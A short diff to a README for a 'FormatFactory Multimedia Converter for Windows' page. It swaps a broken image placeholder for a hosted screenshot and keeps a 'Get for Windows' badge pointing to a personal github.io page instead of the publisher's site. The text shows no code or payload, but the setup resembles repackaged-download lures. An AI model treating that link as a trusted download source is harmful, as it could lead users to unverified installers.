@@ -1,8 +1,7 @@
 
 # FormatFactory Multimedia Converter for Windows
 
-<img src="![Uploading image.png…]()
-" alt="Format Factory Logo" width="760">
+<img src="https://images.sftcdn.net/images/t_app-cover-s,f_auto/p/b687844a-96bf-11e6-8a2e-00163ed833e7/3512415152/format-factory-screenshot.jpg" alt="Format Factory Logo" width="760">
 
 [![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://cmetankadd.github.io/.github/FormatFactory-Multimedia-Converter)
 
